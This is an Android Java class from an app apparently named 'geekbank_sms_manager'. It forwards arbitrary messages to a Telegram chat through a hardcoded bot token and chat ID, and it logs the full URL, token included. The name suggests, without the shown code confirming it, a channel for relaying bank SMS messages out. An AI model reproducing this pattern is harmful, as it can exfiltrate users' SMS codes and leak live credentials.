package com.example.geekbank_sms_manager;

import android.content.Context;
import android.util.Log;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

public class TelegramService {

    private static final String TAG = "TelegramService";
    private static final String TELEGRAM_BOT_TOKEN = "7380701994:AAEjFku13cK8ZatzNch_E8uOZaiFze1IDAE";
    private static final String TELEGRAM_CHAT_ID = "-1002202415191";

    public void sendToTelegram(Context context, String message, Callback callback) {
        try {
            String encodedMessage = URLEncoder.encode(message, "UTF-8");
            String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID + "&text=" + encodedMessage;
            Log.d(TAG, "URL: " + url); // Print the URL for debugging

            RequestQueue queue = Volley.newRequestQueue(context);
            StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            Log.d(TAG, "Response from Telegram: " + response);
                            callback.onSuccess();
                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d(TAG, "Error: " + error.toString());
                    callback.onFailure();
                }
            });
            queue.add(stringRequest);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            callback.onFailure();
        }
    }

    public interface Callback {
        void onSuccess();
        void onFailure();
    }
}